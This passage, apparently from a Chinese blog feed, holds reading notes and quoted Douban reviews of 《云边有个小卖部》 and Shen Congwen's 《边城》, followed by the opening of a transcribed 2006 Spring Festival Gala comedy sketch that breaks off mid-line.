他评</h1><blockquote><center>我们总是要绕一大圈，才明白自己最爱谁</center><p>那个时候，我还不知道，有一天会和爱的人离散；也不知道，有些人真的会彻底消失再也不会回来，不会再见。我不知道，头顶的那片蓝天只能是此生被铭记的回忆而不是什么永远；不知道，清风明月只在特定的时间地点人物身上出现。我不知道，告别会有那么多种，除了死亡，还有杳无音讯、寂静无声……</p><p>终于，在我还不知道这些以前，那些我爱过的又彻底离散的亲人，那些我赤诚相待相依为命过的好友，那个在最好年华里遇见的最好的男孩，那场从未知道需要用一生去做完的美梦……都在毫不留情地岁月里，一一散去。</p><p>昨天晚上一口气读完了《云边有个小卖部》，凌晨三点被故事喂饱的我，沉浸在曾经流逝的韶光年华里，久久不愿入睡。当往事、故乡、还存在和已经离开的人像电影胶片一样，不停地闪现在脑海里的时候，我在心里悄声问自己，“七月，你要哭一场吗？”</p><p>“一个没有故乡的人，走到哪里都是异乡人”，我想，书里面那个云淡风轻的小镇（云边镇），会让每一个有故乡的人看了，都沉浸其中，并且想要一刻不停地飞奔故里。</p><p><img src="https://img2.doubanio.com/view/thing_review/l/public/p2045423.webp" alt="img"></p><p>只想一个人去远方，去很远很远的地方。</p><p><strong>1.青春好像永远属于远方</strong></p><p><strong>“有朵盛开的云，缓缓滑过山顶，随风飘向天边，我们慢慢明白，有些告别，就是最后一面。”</strong></p><p>书中的刘十三，和年轻时候的我们一样，在自己离开老砖旧瓦、绿树白墙、流淌过自己少年时光的家乡时，是还不知道留恋为何物的。</p><p>那个时候的我们会把所有的美景都抹掉，把亲人的好坏都丢掉，把陪伴自己度过无数个年月的玩伴忘掉，把街头那家最好吃的小馆抛诸脑后，把承载自己整个韶光年华的学校吞噬，头也不回地，信誓旦旦的，远走高飞。</p><p>我也是一样。</p><p>高中之前，一直跟着父亲生活，因为父亲的粗心和自我，对他的不满总是很多。</p><p>那个时候，我在心里想，“走吧，离开这里，一个人去远方，去很远很远的地方。”把他放下，把故乡抛下，把闲言碎语忘掉，并且永远不再爱他。</p><p>所以高中三年，我叛逆而倔强，跟父亲吵架，冷战，互相指责，很少回家。</p><p>所以，在高考完最后一场考试的时候，我站在学校的人山人海里放声大哭。</p><p>同学们都以为我是考砸了，伤心难过，只有我自己知道，这一切终于都结束了，而我终于可以头也不回的离开这里了。</p><p>高考完的第二天我就开始收拾行囊，离开了父亲。</p><p>那时我曾未想过，我还会回来，还会想念与他共同生活过的日子，眷恋有自己成长轨迹的地方。</p><p>书中的刘十三，在可以离开云边小镇去上大学的时候，也没想太多的离开了外婆和自己的故乡。</p><p>那个时候，他可能也没想过，自己离开时，不经意看到小时候自己刻在门板上的话（王莺莺小气鬼。），会成为后来字字刻在他心上的句子。</p><p><img src="https://img9.doubanio.com/view/thing_review/l/public/p2045424.webp" alt="img"></p><p>我们爱或者不爱，都不能阻止一些事情的发生，一些人的离去。</p><p><strong>2.有些事，从不因为我们年少无知而少一些冷酷和无情</strong></p><p>外婆对刘十三说，“你再不回来，我就真的老了。”</p><p>这是刘十三上大学后，不常回家，外婆对他说的话。</p><p>我上大学四年，只回过2次家。寒暑假都在外做兼职，不愿回家。</p><p>直到大四那年，爷爷去世。我像是挨了生命的一次重锤，被彻底砸醒。</p><p>父亲不争气，从小到大爷爷奶奶没少照顾我，后来长大了，一心想跑出去，忘了还有什么人，随时会走。</p><p>此生难忘与爷爷最后一次的相见。</p><p>我一生严苛的爷爷，在我最后一次见到他时，已经瘦成了皮包骨头。他像个孩子一样，躺在床上向我哀嚎，“你下次回来，再也见不到你爷爷了，你再也见不到你爷爷了……”。</p><p>我在爷爷的床前泪水涟涟，我人生中第一次体会到了什么是心碎。</p><p>小时候我顽皮，爷爷没少管教我，一直到我上大学离开家，他都没给过我什么好脸色。全家人都怕爷爷，而我应该是最害怕他的那一个。</p><p>可最后的那一刻，以及彻底失去他后的日子里，我再也想不起他任何的不好，只念着他的身形相貌，念着他对我无形中的关心和呵护。</p><p>爷爷的去世，让我彻底懂得了两个词语：后悔，和珍惜。</p><p>我后悔少不更事，没能多经常回家看看，于眨眼之间，彻底失去了自己的挚爱的亲人。</p><p>我想要好好珍惜，还在世的奶奶，还有即便是带着恨意却还健在的父亲。</p><p>我不再和父亲吵架，不再与他失联。我学会了一周打电话问候他一次，一年至少回家三五次。我开始努力赚钱给奶奶些许生活费，我开始在每年的清明回去给爷爷扫墓。</p><p>可有些事，不是我们爱或不爱，就能阻止。</p><p>十三很爱他的外婆，他的外婆也很爱他，可是他还是离开了外婆，外婆还是在他离开的岁月里逐渐苍老。</p><p><img src="https://img1.doubanio.com/view/thing_review/l/public/p2045457.webp" alt="img"></p><p>一切都留不住，我们爱的、恨的、留恋的、怀念的，全都会慢慢消逝。</p><p><strong>3.爱与仇人都会老去</strong></p><p>“在大多数人心中，自己的故乡后来会成为一个点，如同亘古不变的孤岛。”</p><p>书中这样句锥心的话，在年轻的时候，我们是不懂的。可能只有我们真正经历了生死别离，才能够体悟到其中的真意。</p><p>爷爷去世后，我用力珍惜，拼命去爱，自以为懂得爱的几年后，奶奶也走了。</p><p>她奄奄一息的那天早上，我在北京去上班的路上接到父亲的电话。到公司请了假，就争分夺秒的往家赶。可终究，还是没来得及见她最后一面。</p><p>爸爸说，“早回来半小时，你奶奶还在……”</p><p>半小时，平日里浑然不知30分钟有多么重要，而那天仅仅是这30分钟，1800秒，我和奶奶却天人永隔，永不再见。</p><p>书中与刘十三相依为命的外婆去世的时候，我能体会他的心碎。</p><p>就像高中时候关系最好的女同学，她的妈妈在我们高考完第二天去世了那种心碎一样。</p><p><strong>我们对拥有，总是欣然接受；我们对失去，却总是感到猝不及防。</strong></p><p>外婆老了，刘十三是知道的，只是他习惯了，他以为那个一辈子天不怕地不怕的王莺莺（外婆）会永远张牙舞爪的存在在他的生活里，给他做各种各样的美食，叼着烟打麻将，执着的开着小卖部，永远在以一种特别的方式在偷偷地爱着他。</p><p>外婆说，“闯得出去，回得了家，才是硬邦邦的活法。”</p><p>刘十三说，“外婆，你会不会永远陪着我？”</p><p>外婆说，“就算我不在，你也要好好活。”</p><p>刘十三说，“外婆长命百岁。”</p><p>刘十三像是不知外婆老之将至一样，过着每一天，而外婆自己是知道的。</p><p>在外婆得知自己命不久矣的时候，开了一天一夜的拖拉机，把她因失恋而要死要活的孙子接回了家。刘十三回到云边镇，待在外婆身边，外婆依然活得很酷很潇洒，依然毫无保留又从不直接表达出任何爱意的照顾刘十三。直到某天，她突然倒下，刘十三才突然发现一切早有定数的事实。</p><p>外婆说，“外婆真想好好活下去，真想永远陪着你，外婆在，你就有家。”</p><p>当我读到刘十三冒着风雪冒着生命危险，上山给去世的外婆挂灯笼，照亮回家的路的时候，我的心在深夜里颤抖。我懂得，都懂得，那个相依为命的又酷又帅气的人不见了，刘十三变成了没有家的孤魂野鬼。</p><p>可是，生命就是如此的残忍，不管我们爱或者不爱，爱的多，还是爱的少，那些我们爱着的人，都会老去，会离开，会和我们永别。</p><p>在从小抚养我呵护我的爷爷奶奶，都离开以后，我怨恨过，恨生命太短，恨人事无情。</p><p>我问自己，“如果人的一生，所有付出的爱，陪伴的爱人，有一天都会彻底离散，那我们为什么还要去爱？我们为什么还要去经历，要有回忆，要让自己那么疼？我们为什么还要在痛过以后，咬牙接受这一切，像是什么都没有发生过一样，无坚不摧地拼命活着。”</p><p>刘十三说，<strong>小时候知道有一种难过，叫作失望；直到长大以后，他才明白，还有更大的难过，叫作绝望。</strong></p><p>一切都留不住，什么都留不住，我们爱的、恨的、留恋的、怀念的，全都会慢慢消逝。他的外婆，也是一样。</p><p>失去外婆后的刘十三，望着云边镇的山间海洋，想到自己没有外婆了，以后不会再有人举着扫帚，满镇子追他，也没有人一把掀开被子，拖他吃早饭；没有人叼着烟，拍他的后脑勺；没有人擦着汗，在云边一家小卖部搬着箱子，等自己的外孙回家……</p><p>当他想到这些的时候，即便他心碎成泥，他也只能嘶哑的喊：“王莺莺，你不够意思！王莺莺，你小气鬼！王莺莺，你说走就走，你不够意思！”</p><p>心空了，可以离开，可以永不回来，只是心中缺少的那一块，任你如何眼泪横流，如何伤痛泛滥成灾，都不会再被填满了。</p><p><img src="https://img9.doubanio.com/view/thing_review/l/public/p2045425.webp" alt="img"></p><p>假如，你遇见了那个爱你如命的男孩或女孩…</p><p><strong>4.</strong> <strong>假如你遇见了那个爱你如命的男孩或女孩</strong></p><p><strong>“有些人刻骨铭心，没几年会遗忘，有些人不论生死，都陪在身旁。”</strong></p><p>小说中有一个一直很喜欢刘十三的女孩，叫程霜。一个天生多病多难的女孩，一个医生说她活不了多久了，她却不管不顾地活了20年的女孩。</p><p>她简单、勇敢、直爽、大方，一生中逃出家三次，每一次都选择无条件地站在刘十三的身边。也许是他们相遇的太早，也许是他们想要的太多，最终他们失去了彼此。</p><p>遇见程霜那一年，刘十三还在上小学；再见程霜那年，刘十三上大学，刚和初恋分手；程霜陪伴他最久的时间，是在美好的云边镇。</p><p>爱我们的人，可能早已在冥冥中出现，只是我们太年轻了，想要看更精彩的世界，爱更辣的女孩，想要不一样的青春，和梦想自己一定要有一段够酷的打死不悔的爱情。</p><p>所以，上大学的刘十三，第一眼爱上了那个叫牡丹的女孩，当这个女孩离开他，去到别人身旁的时候，他在考场里哭到崩溃，那个时候，他以为牡丹对他而言，是刻骨铭心，永不会忘的人。直到他得知牡丹要结婚了，还在妄想，自己是不是还可以等她，等她离婚了，回到自己身边。</p><p>程霜一直陪着他，陪他失恋，陪他失落，陪他完成工作目标，陪他生活在美丽的小镇。</p><p>开始时，刘十三没有发觉，而当他想要珍惜的时候，却已经来不及。</p><p>后来，在云边镇，程霜问刘十三，如果选一个人做女朋友，选她还是牡丹的时候？</p><p>刘十三突然发现，“牡丹”那个铭心刻骨的名字，他居然好久没有想起过了。</p><p>而等到刘十三去找程霜，想要给她过生日的时候，程霜已经去世了。他只剩下了，想念。</p><p><strong>为什么，我们总是要在绕了一大圈之后，才明白自己最爱谁。</strong></p><p>好朋友看到自己喜欢了12年的男孩结婚了，心如刀绞。</p><p>她哭着跟我说，“12年了，整整12年，我们认识彼此的父母、朋友，了解彼此的性格与习惯，共同走过了最好的青春，经历过那么多难忘的哭与笑的时刻，为什么我们没有在一起，为什么我们没有一起过一一辈子……”</p><p>亲爱的人啊，假如，你遇见了那个爱你如命的男孩或女孩，请你毫不迟疑地走向TA，去往永远。</p><p>不要像故事中的刘十三一样，痛失所爱。</p><p>人的一生中，会有很多种重要的情感发生，故乡是一种，亲人是一种，初恋是一种，成长是一种，遗忘也是一种……。只是这种种感情的可贵，我们必须要过了很多年，才会懂。我想张嘉佳他已经懂了，而我读完了这本书，也懂了。</p><p>—— <font color="blue">引自 <a href="https://book.douban.com/review/9536702/?dt_dapp=1&amp;dt_platform=com.douban.activity.qq_session" target="_blank" rel="noopener">豆瓣 七月</a></font></p></blockquote><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><p>是否被拍成影视作品？（无）</p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《边城》书籍</title>
      <link href="/2022/02/28/%E3%80%8A%E8%BE%B9%E5%9F%8E%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/02/28/%E3%80%8A%E8%BE%B9%E5%9F%8E%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>《边城》是沈从文的代表作，写于一九三三年至一九三四年初。这篇作品如沈从文的其他湘西作品，着眼于普通人、善良人的命运变迁，描摹了湘女翠翠阴差阳错的生活悲剧，诚如作者所言：“一切充满了善，然而到处是不凑巧。既然是不凑巧，因之素朴的善终难免产生悲剧。”</p><p>《边城》写出了一种如梦似幻之美，像摆渡、教子、救人、助人、送葬这些日常小事，在作者来都显得相当理想化，颇有几分“君子田”的气象。当然，矛盾也并非不存在，明眼人一看便知，作者所用的背景材料中便隐伏着社会矛盾的影子。作者亦不曾讳言他的写作意图是支持“民族复兴大业的人”，“给他们一种勇气和信心”。</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>沈从文（1902年12月28日—1988年5月10日），男，原名沈岳焕，乳名茂林，字崇文，笔名休芸芸、甲辰、上官碧、璇若等，湖南凤凰县人，中国著名作家、历史文物研究者。</p><ul><li><a href="https://baike.baidu.com/item/%E6%B2%88%E4%BB%8E%E6%96%87/153063" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/%E6%B2%88%E4%BB%8E%E6%96%87" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><blockquote><p>翠翠在风日里长养着，故把皮肤变得黑黑的，触目为青山绿水，故眸子清明如水晶。自然既长养她且教育她，为人天真活泼，处处俨然如一只小兽物。人又那么乖，如山头黄麂一样，从不想到残忍事情，从不发愁，从不动气。</p><hr><p>若溯流而上，则三丈五丈的深潭皆清澈见底。深潭中为白日所映照，河底小小白石子，有花纹的玛瑙石子，全看得明明白白。水中游鱼来去，皆如浮在空气里。两岸多高山，山中多可以造纸的细竹，长年作深翠颜色，迫人眼目。<font color="blue">（注：《小石潭记》：”潭中鱼可百许头，皆若空游无所依。”）</font></p><hr><p>翠翠温习着两次过节两个日子所见所闻的一切，心中很快乐，好像目前有一个东西，同早间在床上闭了眼睛所看到那种捉摸不定的黄葵花一样，这东西仿佛很明朗的在眼前，却看不准，抓不住。</p><hr><p>话不及说，二老来了，站在翠翠面前微笑着。翠翠也微笑着。</p><hr><p>可是到了冬天，那个圮坍了的白塔，又重新修好了。那个在月下唱歌，使翠翠在睡梦里为歌声把灵魂轻轻浮起的年青人，还不曾回到茶峒来。<br>…………<br>这个人也许永远不回来了，也许“明天”回来！</p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>高中阅读课上第一次读，陶醉在美景中、朦朦胧胧的爱情中。</p><p>大四第二次阅读，这次新加的感受就是叹息翠翠以及大老二老的<code>谁也没说</code>，叹息悲伤的结局。总之，爱就要说出来。</p><p>看了下面的评论，感觉自己并没有读懂《边城》，只是走马观花了两遍，有机会再读。</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><p>原来写爱情的最高境界是谁也没说，谁也没说。</p><p>—— <font color="blue">引自 <a href="https://m.douban.com/book/comment/680019524?dt_platform=com.douban.activity.qq_session&amp;dt_dapp=1" target="_blank" rel="noopener">豆瓣 [已注销]</a></font></p></blockquote><hr><blockquote><center>俱为女子，而我心已消瘦</center><p>这篇书评可能有关键情节透露</p><p>——再读《边城》</p><p>我一辈子走过许多地方的路，行过许多地方的桥，看过许多次数的云，喝过许多种类的酒，却只爱过一个正当最好年龄的人。<br>——沈从文</p><p>俱为女子，我却原本并不喜欢翠翠。</p><p>十四、五岁时第一次读《边城》，就不喜欢这个与自己差不多同龄的女子。十五岁时的翠翠，在风日里长养着，触目皆为青山绿水，一对眸子清明如水晶，活脱脱就是一个自然之子，有着原始的善良和纯真的可爱，应惹来无数爱怜。</p><p>可那时的我却不喜欢，觉得这个女子的纯真过了份，这是她保护自己的盾牌，也是尖锐的武器，一次又一次地刺伤了那些深爱她的人。她的不谙世事，她的含蓄懵懂，全变成一条条致命的引线，引向最终的惨烈。记忆里永远挥之不去的只有最后的悲哀结局，如同改编的同名电影里在昏黄温暖的色调下，却隐隐透出烟水空蒙的凄寒。</p><p>这是我一直都不懂的故事，也是我一直都不懂的世界。作者笔下的茶峒山城，只是一个湘、川、黔三省交界的边境小城，在故事里却仿佛真正成了一个被时间遗忘的安静角落。在那个风云变幻、改朝换代的时代中，不管别处的人们如何不幸挣扎，生死存亡的恐慌感都似乎永远弥漫不到这里。热闹充满生气的小河街，妇人聚集的吊脚楼，负责摆渡的老船夫，在难却盛情的收下过客的一枚铜板后会转送一大把的烟草叶。在那里就连世俗最为不齿的妓女，“也永远那么浑厚”。她们可以为了生计接待四川商人，也可以把所有的眼泪快乐牢牢地系在归期不定的水手身上，有着古代女子“拼将一生休，尽君一日欢”的勇气和无悔，“较之讲道德和廉耻的城市中绅士还更可信任”。这样的水土和民风养育出的翠翠，有我想象中的淳朴，却没有意料内的勇敢。一如她的那段伤痛初恋，在那时的我看来不过是一个简约和克制导致的悲剧。对于这样一个简单的三角故事，作者舍弃了传统的情节要素，没有门第之见没有父母之命媒妁之言，反倒多了民主和放手。可那个女子还是没有把握住自己的幸福，只能回望那一川碧溪，带走自己的爱与希望。</p><p>那时的自己，并不理解这样的含蓄，也不喜欢翠翠的纯真善良毫无机心，当这些品质成为一个人性格的全部时，反倒失去了最基本的一点可爱。于是，我离开这个故事，忘记翠翠，忘记湘西清亮的白河，继续经历自己的青春岁月。</p><p>时隔两年，因缘际会下我再次翻开《边城》，只因为怀念起湘西瓦蓝的云天。故事里的翠翠在成长，已经走到了自己命运中最为重要的转折点。她最终还是选择了固执地等待，等着那个年轻人回来一同去采最喜欢的虎耳草。故事外的我也在长大，走过豆蔻年华，面临着少年人走向成熟的蜕变。而当我怀着这样的心境再次去读这个早已熟悉的故事、读到最后的那一句“这个人也许永远不回来了，也许明天回来！”时，心底的那份惨然和惋惜尚在，却多了几许释然，并不再过多地执着于因那些巧合误会所导致的有情人未成眷属的收场。若说两年前这个故事让我感到的是温暖中透出凄寒，那么两年后我不仅感受到全篇无处不在的寂寞孤独，也更执著于其中几许温暖的色调，依旧昏黄，却足以照亮我的心房。</p><p>而两年后的我真真切切地感受到，俱为女子，翠翠却真是特别的。她不应仅仅只是爷爷疼爱的对象、男子梦中的理想，也是女孩子心中永难消逝的情结。再读时，我不再指责她的懦弱隐忍，而是喜欢她的活泼率真，也爱她的含蓄。因为这才是每个这样年纪的女孩子心中最纯真的一面，也是最真实的一面。</p><p>再品与翠翠有关的章节，我看到了两条线索推动着人物的塑造和情节的发展。最明显的一条自然是三年的端午节，这也是贯穿全文的线索。第一年的端午节由翠翠的回忆带入，与茶峒山城一样，他与傩送的初遇仿佛也是静止于时光中的美好。黄永玉曾以此为题材作过木版画，画中的翠翠只一低首，回眸间却有不胜凉风的娇羞。这样的画面即使只是最简单的白色，也足以在人的心上幻化出万紫千红。即使后来有漫天花雨，在翠翠的印象里也没有那个端午所经历的事甜而美。第二年的端午节，翠翠和爷爷在顺顺吊脚楼上避雨，那个场景在电影中拍得十分温馨祥和。天保一家送的大白鸭和尖角粽子，船总与爷爷间关于翠翠婚事若有若无的谈论，不仅再次体现了地方人情之美，也为下文情节发展提供了一个小小的契机。而到了第三年的端午，所有事纷踵而来，然后走向最后的终局。这三年的端午节对于翠翠的意义不言而遇，也是她感情最明显的体现地。</p><p>不过不同于两年前一直认为的爱情，再读时我却对那两个男子的感情产生了小小的质疑。也许是着墨不多的缘故，天保和傩送的感情仅体现在一次又一次的求婚上。翠翠的纯真美丽，是区别于其他女子的特别，也正是这份特别吸引了他们。可从始至终我都觉得他们只是把翠翠当成一件最美好的东西那样小心翼翼地去追求，可以兄弟相争，可以唱一夜的山歌，可心底其实想要的在这一块纯澈的水晶之外，还是一个节俭持家的女子。但愿这只是我对男子的偏狭。</p><p>可是翠翠，在这时却真的初尝到爱情的甜蜜，焕发出少女的光彩。她会在骂人后听到对方名号时“心里又吃惊又害羞”，沉默一个晚上，也会在爷爷提到嫁给天保时又羞又气地掐断话头。而在面对爷爷正式讲起求婚时的心念更是如电般瞬间即是百转千回，她的心会轻轻地跳动，会即使不知所措也装作从容地等待爷爷的决定。而当心上的事落空时，此刻的心理描写犹为精彩：“翠翠弄明白了，人来做媒的是大老！不曾把头抬起，心忡忡的跳着，脸烧得厉害，仍然剥她的豌豆，且随手把空豆荚抛到水中去，望着它们在流水中从从容容的流去，自己也俨然从容了许多”。她的惊愕和极度失望，以及妄图掩饰的心理过程，在看似随意的动作中暴露无遗。其后面对爷爷的泪水，她的心中又烦又乱，想哭又觉得没有理由哭。就是在这一刻我仿佛明白了过去一直都不理解的事，翠翠并非不愿去大胆争取大胆说出自己的爱情，只是自身少女含蓄的性格，以及对爷爷的顾及使她不知所措，只能以不回应的方式来回应。看似不合情理，却恰恰是人之常情。</p><p>而这种人之常情，却恰恰是当年的自己所不懂的。所以很多路必须亲自走过，才能知道坎坷波折，很多故事只有一读再读，才能体会个中情味。当读到另一条暗线时，才蓦地惊觉，翠翠走过的路，难道不就是自己曾感知过的一切。印象中全篇有四次将翠翠与“新娘”二字联系在一起，有年少无知时扮做新娘的懵懂，也有情窦初开后追看花轿的好奇。她会欢喜会红脸，会爱听取茶峒歌声的缠绵，也会为一片云一颗星而孤独凝眸。看到这里，现在的我会抬头微笑，无论上天赋予了女子多少种不同的性格，在此刻的心绪纵横旖旎情思当皆如是。所以当全篇最后一次在爷爷的葬礼上出现“新嫁娘”这三个字时，才会感受到从未有过的哀凉。梦起之处，梦终之时，翠翠就这样以痴痴站立的方式无声地回应了自己年少梦想的如此终结。面对至亲的离去，至爱的离开，此刻的翠翠有前所未有的真实感。若说前面的娇羞含蓄引人怜惜，那么这时她的默然更贴近我的灵魂。</p><p>是谁说过，不哭过长夜，不能语人生。我想没有经历过青春的甜酸凉薄，大概也不能懂《边城》。就好像当年老师在课堂上一遍又一遍的强调边城的民风淳朴，边城的珍贵难寻，当时的自己却只是不以为然。作者的语言的确很美，平淡如水却自有芬芳，景物描写引人入胜，但是否就真的是独一无二？现在的我已经不会怀疑。面对尘世间铺天盖地的灰土，面对无处不在的窒息感，不再被小心翼翼保护着的自己，越发怀念起茶峒清澈见底的流水，桃杏花里耀眼的紫花布，温柔的黄昏带着薄薄的凄凉。那样的世界，在素淡中自有明澈的光辉，质朴中自有蕴藉隽永之致，只能存在于过往，存在于梦中，存在于记忆，一去就永不再得。所以怎能忘记那山，那人，那只黄狗，那个和我一样大的女孩，她的身上有我最想抓住的洁净和自由，她的故乡是我穷尽一生也到达不了的远方。面对似乎再找不回的美好，心如何不念，如何不消瘦？</p><p>同样面对找不回的过往，作者选择用笔将其记录下来。而对于那些猜测的目光，他曾说过：很多人看我的书近似买椟还珠，你们欣赏我故事的清新，作品背后的热情却忽略了；你们欣赏我文字的朴实，那背后蕴藏的悲痛也忽视了。我不知道自己是否也是一个买椟还珠的人，对于《边城》这样一个故事我只愿单纯地随心而读，不愿加之以所谓深刻的挖掘的目光。我读到了背后的热情和悲痛，却还是想许给自己一个希望。只是语序的不同，但又未尝不可以是作者留下的慈悲，那个在月下唱歌，把灵魂轻轻浮起来的年轻人，“也许明天回来！”。</p><p>每个人心里也许都只爱过一个正当最好年龄的人，作者如是，翠翠如是，我也应如是。然后，我们都将余下的岁月留在了等待里，孤寂地等待。但即使等得眼已垂落、耳已闭锁又如何，毕竟似水的流年还在记忆里，曾经的梦想还在心里，闭上双眼往昔的温暖还一息尚存。</p><p>既然一切都还在，来过就未曾离开，那么即使心已渐渐消瘦，也没有什么是不可释怀的</p><p>—— <font color="blue">引自 <a href="https://book.douban.com/review/2889284/?dt_dapp=1&amp;dt_platform=com.douban.activity.qq_session" target="_blank" rel="noopener">豆瓣 Seela</a></font></p></blockquote><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><ul><li>电影：<a href="https://dragonliu.tk/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E7%94%B5%E5%BD%B1/" target="_blank" rel="noopener">《边城》(1992)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小品精彩台词</title>
      <link href="/2022/02/24/%E5%B0%8F%E5%93%81%E7%B2%BE%E5%BD%A9%E5%8F%B0%E8%AF%8D/"/>
      <url>/2022/02/24/%E5%B0%8F%E5%93%81%E7%B2%BE%E5%BD%A9%E5%8F%B0%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-说事儿2006央视"><a class="markdownIt-Anchor" href="#1-说事儿2006央视"></a> 1 《说事儿》(2006央视)</h1><p>《说事儿》是由<a href="https://baike.baidu.com/item/%E5%BC%A0%E6%83%A0%E4%B8%AD/33442" target="_blank" rel="noopener">张惠中</a>执导，<a href="https://baike.baidu.com/item/%E5%BC%A0%E7%8C%9B/3746186" target="_blank" rel="noopener">张猛</a>、<a href="https://baike.baidu.com/item/%E5%B4%94%E5%87%AF/3510053" target="_blank" rel="noopener">崔凯</a>编剧，<a href="https://baike.baidu.com/item/%E8%B5%B5%E6%9C%AC%E5%B1%B1/131652" target="_blank" rel="noopener">赵本山</a>、<a href="https://baike.baidu.com/item/%E5%AE%8B%E4%B8%B9%E4%B8%B9/622454" target="_blank" rel="noopener">宋丹丹</a>、<a href="https://baike.baidu.com/item/%E5%B4%94%E6%B0%B8%E5%85%83/324929" target="_blank" rel="noopener">崔永元</a>主演的<a href="https://baike.baidu.com/item/%E5%B0%8F%E5%93%81/109145" target="_blank" rel="noopener">小品</a>，于2006年1月28日在《<a href="https://baike.baidu.com/item/2006%E5%B9%B4%E4%B8%AD%E5%A4%AE%E7%94%B5%E8%A7%86%E5%8F%B0%E6%98%A5%E8%8A%82%E8%81%94%E6%AC%A2%E6%99%9A%E4%BC%9A/3878095" target="_blank" rel="noopener">2006年中央电视台春节联欢晚会</a>》中首播。</p><ul><li><a href="https://baike.baidu.com/item/%E8%AF%B4%E4%BA%8B%E5%84%BF/792265" target="_blank" rel="noopener">百度百科</a></li></ul><p><font color="red"><strong>全文高能</strong></font></p><blockquote><p><strong>白云</strong>：你别吃了。你说你这么会儿工夫你吃三盒儿了，你整得人家演播大厅到处都韭菜味儿。不爱跟你出来，你说，你这档次太低了。唉！你记住啊，待会儿录节目的时候，你少说话，听见没？你别像搁铁岭台似的，啥实话都往外嘞，那多丢人哪，啊。你就看我对付他，行不？别吱声，行不？乖，啊。唉！你说这小崔咋还不来呢？太不拿人当腕儿了！搁铁岭台人家等咱俩小时，这中央台得瑟的你说，这玩意……</p><p><strong>小崔</strong>：哎呀！对不起大家，对不起啊，来晚了，对不起。昨天晚上，没睡好觉，你知道吗。哎哟！大叔大妈都来了！</p><p><strong>白云</strong>：来了。</p><p><strong>小崔</strong>：您好啊，大妈。</p><p><strong>白云</strong>：啊，你好。</p><p><strong>小崔</strong>：您好，大叔……</p><p><strong>白云</strong>：哎呀，你赶紧开始吧，啊，俺们底下还俩栏目儿呢，啊，这都，出来一趟，这北京台、天津台，这都得给点儿面子。赶紧说你那开场白吧。快开始吧，啊。</p><p><strong>小崔</strong>：比我还熟呢。各位朋友，欢迎收看《小崔说事》。</p><p><strong>黑土</strong>：嗝！</p><p><strong>小崔</strong>：六年前，我采访过一对儿来自东北的老夫老妻，那……</p><p><strong>黑土</strong>：嗝！</p><p><strong>小崔</strong>：六年过去了，他们有什么变化呢？今……</p><p><strong>黑土</strong>：嗝！</p><p><strong>小崔</strong>：我今……我……</p><p><strong>黑土</strong>：好了。</p><p><strong>白云</strong>：呛风了，你接着吧，说你的。</p><p><strong>小崔</strong>：哎，我都不知道我说什么好了我都。</p><p><strong>白云</strong>：<font color="green">你说你这主持人当的，你这应变能力太差了，几个嗝儿就把你给打蒙了。</font>这么的吧，你坐下，我先采访你几句儿。</p><p><strong>小崔</strong>：行。</p><p><strong>白云</strong>：怎么的小崔，六年没见，听说你抑郁了？</p><p><strong>小崔</strong>：这事儿都传铁岭去了？</p><p><strong>白云</strong>：好点儿没？</p><p><strong>小崔</strong>：好多了！</p><p><strong>白云</strong>：你就别装了，你跟你大叔大妈这你装啥玩意儿你这？都写你脸上了。</p><p><strong>黑土</strong>：<font color="green">是啊，过去你那张脸就哭笑不得的，现在跟紧急集合的似的。</font></p><p><strong>小崔</strong>：他们铁岭还这么夸人呢。</p><p><strong>白云</strong>：（对黑土）拿礼物。（对小崔）过节了，给你带个纪念品，（黑土拿出饭盒递给白云）你这小辈儿的你说……（发现不对，对黑土）啥玩意儿这是，真是的你这人儿……（黑土收起饭盒，拿出书）相当有纪念意义。</p><p><strong>小崔</strong>：哎哟，大妈这《月子》都出版了。</p><p><strong>白云</strong>：看扉页。</p><p><strong>小崔</strong>：哎。</p><p><strong>白云</strong>：扉页。</p><p><strong>小崔</strong>：“谨以此书送给闹心的小崔，愿你看完此书……一觉不醒。白云大妈雅正。”谢谢！</p><p><strong>白云</strong>：还有呢！还有呢！你拿……你给。（黑土拿出手绢）</p><p><strong>小崔</strong>：哎哟，大叔！这不是那二人转的手绢吗？</p><p><strong>黑土</strong>：看扉面儿。</p><p><strong>小崔</strong>：哦。“转一转，摇一摇，天天锻炼准睡着。黑土雅正。”谢谢大叔大妈，你看还给我带礼物，谢谢您。</p><p><strong>黑土</strong>：好几年没见了，你大妈就合计你说带点啥好给孩子……（看白云，回自己座位）</p><p><strong>白云</strong>：哎呀，俺们呀，就是揪心你这没有觉啊。</p><p><strong>小崔</strong>：哎呀，大叔大妈还关心我这睡觉问题哈。你们二老睡眠质量怎么样？</p><p><strong>黑土</strong>：我沾枕